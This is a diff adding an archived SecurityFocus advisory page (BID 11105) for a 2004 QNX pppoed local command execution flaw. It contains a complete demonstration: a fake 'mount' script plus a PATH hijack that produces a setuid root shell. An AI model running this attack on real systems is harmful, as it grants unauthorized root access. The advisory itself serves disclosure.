@@ -1,0 +1,107 @@
+#SpeeDr00t@Black Falcon<br>#bid11105<p><b><span style="font-size: 18pt;">QNX PPPoEd Path Environment Variable Local Command Execution Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/11105/info">info</a><br><a href="http://www.securityfocus.com/bid/11105/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/11105/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/11105/solution">solution</a><br><a href="http://www.securityfocus.com/bid/11105/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				11105
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Design Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 03 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 03 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability is credited to Julio Cesar Fort &lt;julio@rfdslabs.com.br&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					QNX RTOS 6.2 Update Patch A<br/>
+					
+				
+					QNX RTOS 6.2 <br/>
+					
+				
+					QNX RTOS 6.1 <br/>
+					
+				
+					QNX RTOS 2.4 <br/>
+					
+				
+					QNX RTOS  4.25<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	There is no exploit required, the following demonstration is available:<br/><br/>$ cd /tmp<br/>$ cat &lt;&lt; _EOF_ &gt; mount<br/>#!/bin/sh<br/>cp /bin/sh /tmp/rootshell<br/>chown root /tmp/rootshell<br/>chmod 4777 /tmp/rootshell<br/>echo "Here comes your root shell"<br/>_EOF_<br/><br/>$ chmod 755 mount<br/>$ export PATH=/tmp:$PATH<br/>$ /usr/sbin/pppoed<br/>$ ls -la /tmp<br/>-rwxr-xr-x    1 sandimas users          88 Aug  25 2004 mount<br/>-rwsrwxrwx    1 root     100        153384 Jun  22 2001 /tmp/rootshell<br/>$ /tmp/rootshell<br/>Here comes your root shell<br/># uname -a<br/>QNX sandimas 6.1.0 2001/06/25-15:31:48 edt x86pc x86<br/>#
+	
+		<ul>
+</ul>
+</div>
